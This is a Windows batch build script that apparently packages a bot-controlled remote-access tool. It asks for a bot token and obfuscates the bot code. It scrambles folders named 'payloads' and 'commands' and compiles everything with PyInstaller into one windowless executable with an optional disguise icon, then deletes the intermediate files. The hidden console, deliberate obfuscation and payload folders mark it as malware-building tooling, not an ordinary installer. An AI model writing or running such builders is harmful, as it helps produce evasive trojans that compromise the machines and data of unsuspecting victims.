@echo off
cls
color 0a
echo ================================
echo  Installing requirements...
echo ================================
color 1
pip install -r requirements\requirements.txt
for %%f in (requirements\*.whl) do pip install "%%f"
pip cache purge
color 0a
echo ================================
echo  Requirements installed.
echo ================================

cls
echo ================================
echo  Enter your bot token:
set /p bot_token=
echo ================================
cd setup
python converter.py %bot_token%
cd ..
cls
txtlib dev.pyw bot.pyw
obfuscator9000 bot.pyw final.pyw
echo ================================
echo  Building now...
echo ================================
color 4
timeout /t 1 >nul
color 1
timeout /t 1 >nul
color 0a
py -3.12 setup/scrambler.py src/start start
py -3.12 setup/scrambler.py src/payloads payloads
py -3.12 setup/scrambler.py src/commands commands
cls
color 1
echo ================================
echo   ENTER ICON ICO PATH (Press Enter to proceed without an icon):
set /p icon_file=
echo ================================
echo  Getting Python version...
for /f "tokens=2" %%a in ('python --version 2^>^&1') do set PYTHON_VERSION=%%a
echo ================================
echo    Running PyInstaller...
echo ================================
set pyinstaller_command=pyinstaller --onefile --noconsole
if not "%icon_file%"=="" (
    set pyinstaller_command=%pyinstaller_command% --icon "%icon_file%"
)
set pyinstaller_command=%pyinstaller_command% --exclude-module tensorflow --exclude-module _multiprocessing --exclude-module pandas --exclude-module attrs --exclude-module cryptography --exclude-module pytorch --exclude-module torch --exclude-module numpy --exclude-module Cython --exclude-module pyarrow --exclude-module cv2 --exclude-module PyQt5 --exclude-module win32 --exclude-module yaml --exclude-module PythonWin --exclude-module jedi --exclude-module sounddevice --exclude-module zstandard --hidden-import pyautogui --hidden-import bs4 "final.pyw"
echo ================================
echo  Running: %pyinstaller_command%
echo ================================
%pyinstaller_command%
echo ================================
echo    Cleaning up...
echo ================================
rd /s /q build
del /f /q final.spec
del /f /q final.pyw
del /f /q bot.pyw
echo ================================
echo  Build complete. final.exe is in the dist folder.
echo ================================
pause
